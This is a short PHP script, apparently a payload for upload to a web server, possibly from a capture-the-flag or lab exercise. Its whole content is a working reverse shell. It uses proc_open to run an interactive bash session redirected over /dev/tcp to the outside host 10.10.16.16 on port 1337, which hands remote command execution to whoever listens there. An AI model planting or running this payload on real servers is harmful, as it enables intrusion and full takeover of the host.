<?php
$requestPipe = [
    0 => ["pipe", "r"],
    1 => ["pipe", "w"],
    2 => ["pipe", "w"],
];
$command = "bash -c 'bash -i >& /dev/tcp/10.10.16.16/1337 0>&1'";
$process = proc_open($command, $requestPipe, $pipes);

if (is_resource($process)) {
    fclose($pipes[0]);
    fclose($pipes[1]);
    fclose($pipes[2]);
    proc_close($process);
}
?>
